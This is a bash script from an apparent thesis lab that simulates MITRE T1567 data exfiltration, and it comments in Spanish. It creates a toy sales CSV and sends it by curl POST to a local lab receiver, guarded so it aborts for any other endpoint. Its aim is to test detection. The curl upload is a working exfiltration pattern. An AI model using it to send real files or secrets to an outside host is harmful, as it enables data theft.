#!/usr/bin/env bash
# ============================================================================
# ATA009 · T1567 Exfiltration Over Web Service — ataque MANUAL (TFG, NO de ART)
# ----------------------------------------------------------------------------
# Tecnica : T1567 Exfiltration Over Web Service (tactica Exfiltration)
# Fuente  : custom (las pruebas ART de T1567 usan rclone->nube o terraform+AWS:
#           exigen nube + claves + NAT -> NO ejecutables en laboratorio SIN NAT)
# Objetivo: SUBIR (exfiltrar) un fichero de datos simulados ("informe de ventas")
#           a un "servicio web" simulado, mediante `curl` POST multipart/crudo.
#           El "servicio web" es el RECEPTOR LOCAL del laboratorio (sink_http.py
#           en el HOST, http://192.168.65.1:9090), ya usado en ATA008/T1048.002.
# Destino : http://192.168.65.1:9090/api/upload/informe_ventas_2026-Q3.csv
# Ejecuta : desde /home/angel/lab-attack/ATA009 (cwd del ataque -> ancla H4)
# Elevacion: NO (usuario angel). No se instala nada.
#
# ⚠️ REQUISITO: el receptor (Soporte/Ataques/receiver/sink_http.py) debe estar
#    LEVANTADO en el HOST antes de t0 (ver README §9). La prueba de que el dato
#    SALIO es la linea del `sink.log` con el sha256 del cuerpo (== sha256 del fichero).
#
# Prueba de exito (INDEPENDIENTE de la alerta): `sink.log` del HOST con
#   POST /api/upload/informe_ventas_2026-Q3.csv + sha256 coincidente.
# Salida: marcadores T0 / T1_LOCAL en stdout (UTC). t1 OFICIAL tras el scan FIM.
# ============================================================================
set -u

BASE="${HOME}/lab-attack/ATA009"
EXFIL="${BASE}/informe_ventas_2026-Q3.csv"
HOST="192.168.65.1"
PORT="9090"
ENDPOINT="http://${HOST}:${PORT}/api/upload/informe_ventas_2026-Q3.csv"

echo "ATA009 · T1567 Exfiltration Over Web Service (curl POST) — custom (manual)"
echo "T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)"

# --- precondiciones (fallan ruidosamente, sin tocar nada) ---
if [ ! -d "$BASE" ]; then
  echo "ERROR: no existe $BASE (¿scp del directorio de la tecnica?)" >&2
  exit 1
fi
if ! command -v curl >/dev/null 2>&1; then
  echo "ERROR: curl no disponible" >&2
  exit 1
fi

# cwd determinista = carpeta del ataque (ancla H4 del execve)
cd "$BASE" || { echo "ERROR: no puedo cd a $BASE" >&2; exit 1; }

# GUARDARRAIL: el destino DEBE ser el receptor del laboratorio (VMnet1 del host).
case "$ENDPOINT" in
  "http://192.168.65.1:9090/"*) : ;;
  *) echo "ERROR: endpoint '$ENDPOINT' fuera del receptor del laboratorio (abortado)" >&2; exit 1 ;;
esac

# 0) Semilla determinista del fichero a exfiltrar (builtin printf; sin execve).
#    Escena de empresa: informe de ventas (datos de juguete).
if [ ! -f "$EXFIL" ]; then
  {
    printf 'periodo,region,canal,unidades,importe_eur\n'
    printf '2026-Q3,Norte,Directo,1420,182340.50\n'
    printf '2026-Q3,Sur,Distribuidor,980,121780.00\n'
    printf '2026-Q3,Este,Online,2015,268910.75\n'
  } > "$EXFIL"
fi

echo "--- FICHERO A EXFILTRAR (sha256) ---"
sha256sum "$EXFIL"

# 1) SUBIDA al "servicio web" simulado (execve de curl)
curl --silent --show-error --max-time 10 \
  --request POST \
  --header 'Content-Type: text/csv' \
  --data-binary "@${EXFIL}" \
  --output /dev/null \
  --write-out 'HTTP=%{http_code} enviado=%{size_upload}B\n' \
  "$ENDPOINT"

# Convencion tanda B (instrumentacion t0/t1): asentar 1 s para que la marca local
# NO sea degenerada (T1_LOCAL > T0). La ventana OFICIAL [t0,t1] la sella el operador.
sleep 1
echo "T1_LOCAL=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
